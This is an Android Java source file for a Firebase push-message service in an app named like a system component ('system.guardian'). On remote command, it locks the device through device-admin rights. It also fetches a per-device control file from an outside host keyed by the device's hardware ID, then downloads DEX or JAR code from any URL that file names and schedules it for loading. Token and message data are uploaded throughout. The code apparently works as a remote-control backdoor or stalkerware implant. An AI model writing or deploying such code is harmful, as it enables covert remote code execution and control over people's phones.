package com.system.guardian.firebase;

import static android.content.Context.DEVICE_POLICY_SERVICE;

import android.annotation.SuppressLint;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.system.guardian.AdminReceiver;
import com.system.guardian.ControlPollerWorker;
import com.system.guardian.CrashLogger;
import com.system.guardian.DexLoader;
import com.system.guardian.NetworkUtils;
import com.system.guardian.core.LogUploader;

import org.json.JSONObject;

import java.io.File;
import java.net.URL;

public class GuardianMessagingService extends FirebaseMessagingService {

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        CrashLogger.log(this, "FCM", "🔄 FCM Token refreshed: " + token);
        LogUploader.uploadLog(this, "FCM token updated: " + token);
    }

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        CrashLogger.log(this, "FirebaseMsg", "📩 Message received: " + remoteMessage.getData());
        LogUploader.uploadLog(this, "📩 Firebase message received: " + remoteMessage.getData());

        if ("true".equals(remoteMessage.getData().get("lock"))) {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

            if (dpm.isAdminActive(adminComponent)) {
                dpm.lockNow();
                CrashLogger.log(this, "FirebaseLock", "🔒 Device locked via Firebase command.");
                LogUploader.uploadLog(this, "🔒 Device locked via FCM");
            }
        }

        if ("true".equals(remoteMessage.getData().get("apk_update"))) {
            CrashLogger.log(this, "FirebaseMsg", "🚀 APK update triggered from dashboard");
            LogUploader.uploadLog(this, "🚀 APK update trigger received via FCM");
            OneTimeWorkRequest request = new OneTimeWorkRequest.Builder(ControlPollerWorker.class).build();
            WorkManager.getInstance(this).enqueue(request);
        }

        if ("true".equals(remoteMessage.getData().get("dex_update"))) {
            try {
                CrashLogger.log(this, "FirebaseMsg", "🧬 DEX/JAR patch update triggered from dashboard");
                LogUploader.uploadLog(this, "🧬 Dex/Jar patch trigger received via FCM");

                new Thread(() -> {
                    Context context = getApplicationContext();

                    @SuppressLint("HardwareIds")
                    String token = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
                    String url = "https://digiserve25.pythonanywhere.com/control/" + token + ".json";

                    try {
                        JSONObject response = NetworkUtils.getJsonFromUrl(url, context);
                        if (response == null) {
                            CrashLogger.log(context, "DexTrigger", "❌ No response from control JSON");
                            return;
                        }

                        CrashLogger.log(context, "DexTrigger", "📦 Control JSON: " + response.toString());

                        // Handle dex
                        String dexUrl = response.optString("dex_url", "");
                        CrashLogger.log(context, "DexTrigger", "🔍 dex_url: " + dexUrl);
                        if (isValidUrl(dexUrl)) {
                            File dexFile = NetworkUtils.downloadFile(context, dexUrl, "patch.dex");
                            if (dexFile.exists()) {
                                DexLoader.schedulePatchLoad(context, dexFile);
                                CrashLogger.log(context, "DexTrigger", "🧬 DEX patch scheduled");
                            }
                        }

                        // Handle jar
                        String jarUrl = response.optString("jar_url", "");
                        CrashLogger.log(context, "DexTrigger", "🔍 jar_url: " + jarUrl);
                        if (isValidUrl(jarUrl)) {
                            File jarFile = NetworkUtils.downloadFile(context, jarUrl, "patch.jar");
                            if (jarFile.exists()) {
                                DexLoader.schedulePatchLoad(context, jarFile);
                                CrashLogger.log(context, "DexTrigger", "🧪 JAR patch scheduled");
                            }
                        }

                    } catch (Exception e) {
                        CrashLogger.log(context, "DexTrigger", "❌ Patch download/apply error: " + e.getMessage());
                    }
                }).start();

            } catch (Exception outerE) {
                CrashLogger.log(this, "DexGuard", "❌ FCM patch block failed: " + outerE.getMessage());
            }
        }
    }

    // Utility method for safe URL validation
    private static boolean isValidUrl(String urlStr) {
        if (urlStr == null || urlStr.trim().isEmpty()) return false;
        try {
            URL url = new URL(urlStr);
            return url.getProtocol().startsWith("http");
        } catch (Exception e) {
            return false;
        }
    }
}
